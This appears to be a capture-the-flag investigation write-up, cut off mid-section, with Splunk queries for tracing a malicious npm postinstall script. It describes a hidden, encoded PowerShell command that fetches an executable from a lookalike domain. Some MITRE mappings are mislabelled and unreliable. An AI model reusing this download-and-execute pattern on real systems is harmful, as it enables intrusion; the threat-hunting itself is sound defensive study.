@@ -1,0 +1,682 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Health Hazard</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="22c5b2cc-075b-80ee-bbdd-fd28543da0d3" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://cdn.sanity.io/images/bwq4c255/production/f0dd562fb820be2089f94fd1d1b2809275b1f0da-600x600.png?rect=0,122,600,356&amp;w=310&amp;h=184&amp;fm=webp&amp;dpr=1.2244897959183674"/></div><h1 class="page-title">Health Hazard</h1><p class="page-description"></p></header><div class="page-body"><p id="22c5b2cc-075b-807d-a357-dd3bfd87b5e4" class="">
+</p><hr id="22c5b2cc-075b-805a-881e-dc60acf848c6"/><p id="22c5b2cc-075b-809e-ab05-f69ca9026759" class=""><strong>Phase 1: Initial Compromise &amp; Script Execution Trigger</strong></p><ul id="22c5b2cc-075b-80b8-9ba5-d653a7e96826" class="bulleted-list"><li style="list-style-type:disc"><strong>Title:</strong> Malicious Package Installation and Post-Install Script Execution</li></ul><ul id="22c5b2cc-075b-800f-a778-eefe90d35f26" class="bulleted-list"><li style="list-style-type:disc"><strong>Adversary Step Description:</strong> The user PAW-TOM\itadmin-tom executes the command npm install healthchk-lib@1.0.1 within the C:\Development\ directory. This command is run by node.exe, which was itself launched by a PowerShell process (PID 1452). During the installation process, node.exe creates the malicious postinstall.ps1 script file within the package&#x27;s directory (C:\Development\node_modules\healthchk-lib\scripts\). Immediately following this, the node.exe process executes the postinstall script by launching a cmd.exe process.</li></ul><ul id="22c5b2cc-075b-80e0-a969-cc58d4722c53" class="bulleted-list"><li style="list-style-type:disc"><strong>Timestamp (Observed):</strong> 21/06/2025 10:58:24.000 AM (Event 43445 - node.exe launch) and 21/06/2025 10:58:27.000 AM (Event 43448 - script creation, Event 43450 - cmd.exe launch by node.exe)</li></ul><ul id="22c5b2cc-075b-80e8-9ad2-e2215028762f" class="bulleted-list"><li style="list-style-type:disc"><strong>MITRE ATT&amp;CK:</strong><ul id="22c5b2cc-075b-8031-897a-c9a775584784" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Initial Access (TA0001)<ul id="22c5b2cc-075b-8073-934d-c1d992406087" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Supply Chain Compromise (T1195) - Compromise Software Supply Chain (T1195.002).</li></ul></li></ul><ul id="22c5b2cc-075b-8022-bc81-e659a5227203" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Execution (TA0002)<ul id="22c5b2cc-075b-8026-8b5f-f0b245de4309" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Command and Scripting Interpreter (T1059) - Nodejs (T1059.009), Windows Command Shell (T1059.003).</li></ul></li></ul><ul id="22c5b2cc-075b-80a7-bea8-ffa50a3136fc" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Persistence (TA0003) - <em>Note: While this phase triggers the mechanism, the persistence itself is set in Phase 3.</em><ul id="22c5b2cc-075b-802a-bc67-d4627a55d17d" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Event Triggered Execution (T1546) - InstallUtil (T1546.009) or similar, depending on how postinstall is classified, but primarily via Command and Scripting Interpreter.</li></ul></li></ul></li></ul><ul id="22c5b2cc-075b-80b4-8cf7-e763e6b83360" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected User:</strong> PAW-TOM\itadmin-tom (The user whose action triggered the installation)</li></ul><ul id="22c5b2cc-075b-8066-bca1-c2947d59cc69" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected Asset:</strong> paw-tom (Processes: powershell.exe (root), node.exe, cmd.exe; File System: creation of postinstall.ps1)</li></ul><ul id="22c5b2cc-075b-8044-ab0c-d57d226151d7" class="bulleted-list"><li style="list-style-type:disc"><strong>IOCs (Specific to this Phase):</strong><ul id="22c5b2cc-075b-8078-8d44-e0bd371e4a22" class="bulleted-list"><li style="list-style-type:circle">NPM Package: healthchk-lib@1.0.1</li></ul><ul id="22c5b2cc-075b-80e7-b439-ed4f54b0033e" class="bulleted-list"><li style="list-style-type:circle">CommandLine (node.exe): &quot;C:\\Program Files\\nodejs\\node.exe&quot; &quot;C:\\Program Files\\nodejs/node_modules/npm/bin/npm-cli.js&quot; install healthchk-lib@1.0.1</li></ul><ul id="22c5b2cc-075b-80cb-9baf-cd222f2c81b4" class="bulleted-list"><li style="list-style-type:circle">Image (node.exe): C:\\Program Files\\nodejs\\node.exe (ProcessGuid {c5d2b969-9050-6856-e101-000000002a01})</li></ul><ul id="22c5b2cc-075b-8000-b8fc-caa7d93aaddb" class="bulleted-list"><li style="list-style-type:circle">ParentImage (of node.exe): C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (ProcessGuid {c5d2b969-8f87-6856-4201-000000002a01})</li></ul><ul id="22c5b2cc-075b-8071-95cb-cedb9d53f90a" class="bulleted-list"><li style="list-style-type:circle">TargetFilename (File Created): C:\\Development\\node_modules\\healthchk-lib\\scripts\\postinstall.ps1 (Created by node.exe ProcessGuid {c5d2b969-9050-6856-e101-000000002a01})</li></ul><ul id="22c5b2cc-075b-80b3-b017-e17a6a0accee" class="bulleted-list"><li style="list-style-type:circle">Image (cmd.exe process): C:\\Windows\\System32\\cmd.exe (ParentProcessGuid {c5d2b969-9050-6856-e101-000000002a01})</li></ul></li></ul><ul id="22c5b2cc-075b-80d0-81ea-e0008e73c190" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Hunting Steps:</strong><ol type="1" id="22c5b2cc-075b-8087-8248-f921fb52dce3" class="numbered-list" start="1"><li><strong>Identify npm install Processes (The true beginning):</strong> Search for node.exe executing npm install specifically targeting healthchk-lib@1.0.1. Use EventCode=1.<ul id="22c5b2cc-075b-80e1-92ac-fd4ba8b1670d" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Query:</strong>Generated splunk<p id="22c5b2cc-075b-805d-b740-d23a44a04d17" class=""><code>      sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1 Image=&quot;*\\nodejs\\node.exe&quot; CommandLine=&quot;*npm-cli.js* install healthchk-lib@1.0.1*&quot;<br/>| table _time ComputerName User Image ParentImage CommandLine ParentCommandLine ProcessId ProcessGuid ParentProcessGuid</code></p><p id="22c5b2cc-075b-8095-a775-dc4f5b9670e5" class=""><em>Interpretation:</em> This finds the initial trigger process and its parent.</p></li></ul></li></ol><ol type="1" id="22c5b2cc-075b-8052-adaf-d65a77d89333" class="numbered-list" start="2"><li><strong>Identify Script File Creation by node.exe:</strong> Search for file creation events (EventCode=11) where node.exe is the image and the target filename is the postinstall.ps1 script path. Link this back to the node.exe ProcessGuid found in Step 1.<ul id="22c5b2cc-075b-806c-867e-e39ee5a4e54d" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Query:</strong>Generated splunk<p id="22c5b2cc-075b-8034-b932-ff598c29eb03" class=""><code>      sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=11 Image=&quot;*\\nodejs\\node.exe&quot; TargetFilename=&quot;*\\node_modules\\healthchk-lib\\scripts\\postinstall.ps1&quot; ProcessGuid IN ({ProcessGuids from Step 1})<br/>| table _time ComputerName User Image TargetFilename ProcessId ProcessGuid</code></p><p id="22c5b2cc-075b-8001-8fd8-ffbd7f39593c" class="">IGNORE_WHEN_COPYING_START</p><p id="22c5b2cc-075b-8039-8002-ea6fd06c515d" class="">content_copy  download  Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>. Splunk</p><p id="22c5b2cc-075b-8060-861b-fd0839393c00" class="">IGNORE_WHEN_COPYING_END</p><p id="22c5b2cc-075b-80d0-8e67-db70adad6493" class=""><em>Interpretation:</em> This confirms the malicious script file was created by the npm install process.</p></li></ul></li></ol><ol type="1" id="22c5b2cc-075b-80d1-9c9a-ea76df917471" class="numbered-list" start="3"><li><strong>Identify cmd.exe Spawning from node.exe:</strong> Search for cmd.exe process creation (EventCode=1) where the parent image is node.exe and the ParentProcessGuid matches the node.exe process from Step 1. This confirms the post-install script is being executed.<ul id="22c5b2cc-075b-80ee-aa81-d4b51e2aa6c7" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Query:</strong>Generated splunk<p id="22c5b2cc-075b-80f6-8b03-ed548d798330" class=""><code>      sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1 Image=&quot;*\\cmd.exe&quot; ParentImage=&quot;*\\nodejs\\node.exe&quot; ParentProcessGuid IN ({ProcessGuids from Step 1})<br/>| table _time ComputerName User Image ParentImage CommandLine ParentCommandLine ProcessId ParentProcessId ProcessGuid ParentProcessGuid</code></p><p id="22c5b2cc-075b-80ed-8c29-fb3ff9a59249" class="">IGNORE_WHEN_COPYING_START</p><p id="22c5b2cc-075b-802f-91c0-e94e258364b0" class="">content_copy  download  Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>. Splunk</p><p id="22c5b2cc-075b-8026-aff7-feca404d07b8" class="">IGNORE_WHEN_COPYING_END</p><p id="22c5b2cc-075b-8014-b155-d66c1f86095f" class=""><em>Interpretation:</em> This shows cmd.exe being launched by the installation process to run the script.</p></li></ul></li></ol></li></ul><hr id="22c5b2cc-075b-8091-ad8c-ea1d15f81633"/><p id="22c5b2cc-075b-803e-ac15-c4a81c087ef7" class=""><strong>Phase 2: Encoded Command Execution &amp; Malware Download Attempt</strong></p><ul id="22c5b2cc-075b-805a-a57e-d0ff0228b3b8" class="bulleted-list"><li style="list-style-type:disc"><strong>Title:</strong> Obfuscated Script Execution and Attempted External Payload Retrieval</li></ul><ul id="22c5b2cc-075b-808b-8c1c-f766edb06a69" class="bulleted-list"><li style="list-style-type:disc"><strong>Adversary Step Description:</strong> The cmd.exe process launched in Phase 1 executes the postinstall script by launching a hidden PowerShell process (powershell.exe -NoP -W Hidden -EncodedCommand ...). The encoded command within this PowerShell process attempts to download a malicious executable (SystemHealthUpdater.exe) from the suspicious domain global-update.wlndows.thm using Invoke-WebRequest and save it to the user&#x27;s AppData directory. A DNS query for the malicious domain is observed during this phase, resolving to ::ffff:127.0.0.1 (localhost), indicating the download attempt likely failed to reach the intended remote server but highlighting the communication attempt. The execution of the encoded command also results in the creation of a temporary PowerShell script file.</li></ul><ul id="22c5b2cc-075b-80ee-8f7e-d6ca27d24f4b" class="bulleted-list"><li style="list-style-type:disc"><strong>Timestamp (Observed):</strong> 21/06/2025 10:58:27.000 AM (Event 43451 - encoded PowerShell launch, Event 43452 - temp script creation) and 21/06/2025 10:58:29.000 AM (Event 43455 - DNS query)</li></ul><ul id="22c5b2cc-075b-800c-9b6b-fb305926485e" class="bulleted-list"><li style="list-style-type:disc"><strong>MITRE ATT&amp;CK:</strong><ul id="22c5b2cc-075b-80e4-b969-e59accb6652c" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Execution (TA0002)<ul id="22c5b2cc-075b-80bc-b99e-daff8e2e6510" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Command and Scripting Interpreter (T1059) - PowerShell (T1059.001).</li></ul></li></ul><ul id="22c5b2cc-075b-80fe-94ca-d4e8778bb788" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Defense Evasion (TA0005)<ul id="22c5b2cc-075b-8029-867a-daa0343fc9d8" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Obfuscated Files or Information (T1027) - Encoded Content (T1027.003).</li></ul></li></ul><ul id="22c5b2cc-075b-80be-908e-cd0438392950" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Command and Control (TA0011)<ul id="22c5b2cc-075b-80fa-b8e1-e92999c9a326" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Application Layer Protocol (T1071) - DNS (T1071.004) and Web Protocols (T1071.001).</li></ul></li></ul><ul id="22c5b2cc-075b-808b-8eb5-d266a76b331d" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Ingress Tool Transfer (TA0010)<ul id="22c5b2cc-075b-80fc-94a6-cd6517b39728" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Transfer from External Media, Stage Capabilities (T1105).</li></ul></li></ul></li></ul><ul id="22c5b2cc-075b-8086-a469-ed9b8a653152" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected User:</strong> PAW-TOM\itadmin-tom</li></ul><ul id="22c5b2cc-075b-80c7-a2be-c41483166f10" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected 